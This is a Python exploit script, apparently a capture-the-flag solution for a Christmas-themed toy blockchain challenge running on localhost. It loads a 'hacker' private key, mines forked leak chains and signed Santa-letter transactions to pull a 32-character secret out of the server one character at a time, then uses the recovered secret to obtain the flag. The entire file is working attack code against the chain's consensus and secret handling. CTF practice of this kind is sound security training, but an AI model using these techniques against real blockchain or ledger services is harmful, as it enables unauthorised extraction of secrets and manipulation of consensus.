import hashlib
import json
import requests
import uuid
import random
import string
import time

from pathlib import Path
from cryptography.hazmat.primitives import serialization

_URL = "http://localhost"
_HACKER_KEY_PATH = Path("/challenge/keys/hacker/key")
_SECRET_KEY_LEN = 32

def hash_block(block):
    block_str = json.dumps(block, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(block_str.encode()).hexdigest()

def mine_block(target_block):
    while True:
        current_hash = hash_block(target_block)
        if current_hash.startswith("0000"):
            print(f"[+] Nonce found: {target_block['nonce']}")
            print(f"[+] Hash: {current_hash}")
            break
        target_block["nonce"] += 1
    return target_block, current_hash


def submit_block(block):
    index = block["index"]
    prev_hash = block["prev_hash"]
    print(f"Submitting block index {index}, prev_hash {prev_hash}")
    resp = requests.post(f"{_URL}/block", json=block)
    if resp.status_code == 200:
        return True
    else:
        return False

def mine_confirmations(prev_hash, block_index, n):
    blocks = []
    for i in range(n):
        target_block = {
            "index": block_index + i,
            "prev_hash": prev_hash,
            "nonce": 0,
            "txs": [],
            "nice": None,
        }
        target_block, block_hash = mine_block(target_block)
        prev_hash = block_hash
        blocks.append(target_block)
    return blocks

def leak_flag(prev_hash, block_index, secret_message, private_key):
    letter_text = f"Dear Santa,\n\nFor christmas this year I would like {secret_message}"

    tx = {
        "src": "hacker",
        "dst": "santa",
        "type": "letter",
        "letter": letter_text,
        "nonce": str(uuid.uuid4()),
    }

    payload = {
        "src": tx["src"],
        "dst": tx["dst"],
        "type": tx["type"],
        "letter": letter_text,
        "nonce": tx["nonce"],
    }

    msg = json.dumps(payload, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(msg.encode()).digest()
    sig = private_key.sign(digest).hex()

    tx["sig"] = sig

    index = block_index

    target_block = {
        "index": index,
        "prev_hash": prev_hash,
        "nonce": 0,
        "txs": [tx],
        "nice": None,
    }
    target_block, block_hash = mine_block(target_block)
    confirmations = mine_confirmations(block_hash, index+1, 5)

    return [target_block] + confirmations

def create_secret_leak_chain(prev_hash, block_index, letter_index, private_key):
    letter_text = f"Dear Santa,\n\nFor christmas this year I would like secret index #{letter_index}"

    tx = {
        "src": "hacker",
        "dst": "santa",
        "type": "letter",
        "letter": letter_text,
        "nonce": str(uuid.uuid4()),
    }

    payload = {
        "src": tx["src"],
        "dst": tx["dst"],
        "type": tx["type"],
        "letter": letter_text,
        "nonce": tx["nonce"],
    }

    msg = json.dumps(payload, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(msg.encode()).digest()
    sig = private_key.sign(digest).hex()

    tx["sig"] = sig

    index = block_index

    target_block = {
        "index": index,
        "prev_hash": prev_hash,
        "nonce": 0,
        "txs": [tx],
        "nice": None,
    }
    target_block, block_hash = mine_block(target_block)
    confirmations = mine_confirmations(block_hash, index+1, 5)

    return [target_block] + confirmations

def wait_for_leaked_message(nonce):
    while True:
        pool_resp = requests.get(f"{_URL}/txpool").json()

        for tx in pool_resp["txs"]:
            if tx["nonce"] == f"{nonce}-gift":
                print(tx["gift"])
                return tx["gift"]

        time.sleep(0.1)

def main():
	key_bytes = _HACKER_KEY_PATH.read_bytes()
	private_key = serialization.load_ssh_private_key(key_bytes, password=None)

	print("Loading pre-mined chain")
	with open("blocks", "rt") as f:
		chain = json.load(f)

	leak_index_blocks = {}

	# We are going to start mining after this block.
	# We assume that we will finish before the rest of the chain reach this point.
	BASE_BLOCKS=100

	# For each secret character, we mine a chain that would leak that character,
	# But don't submit any of those blocks.
	for secret_index in range(_SECRET_KEY_LEN):
		chain_index = BASE_BLOCKS + 10 * secret_index 
		print(f"Mining leak chain for index {secret_index}, on top of block {chain_index}")

		block_index = chain[chain_index]["index"]
		blocks = create_secret_leak_chain(chain[chain_index]["prev_hash"], block_index, secret_index, private_key)
		leak_index_blocks[secret_index] = blocks

	secret_all = []
	last_unsubmitted_index = 0
	for secret_index in range(_SECRET_KEY_LEN):
		chain_index = BASE_BLOCKS + 10 * secret_index
		print(f"Submitting chain at index {chain_index}")

		for block in chain[last_unsubmitted_index:chain_index]:
			submit_block(block)

		last_unsubmitted_index = chain_index

		for block in leak_index_blocks[secret_index]:
			submit_block(block)

		want_nonce = leak_index_blocks[secret_index][0]["txs"][0]["nonce"]
		secret_char = wait_for_leaked_message(want_nonce)
		secret_all.append(secret_char)
		secret_so_far = ''.join(secret_all)
		print(f"Leaked char {secret_char}, secret so far: {secret_so_far}")

	# Finally, sent a transaction asking for the full thing.
	chain_index += 100
	block_index = chain[chain_index]["index"]
	blocks = leak_flag(chain[chain_index]["prev_hash"], block_index, ''.join(secret_all), private_key)
	for block in chain[:chain_index]:
		submit_block(block)

	for block in blocks:
		submit_block(block)

	want_nonce = blocks[0]["txs"][0]["nonce"]
	flag = wait_for_leaked_message(want_nonce)
	print(flag)


if __name__ == "__main__":
    main()
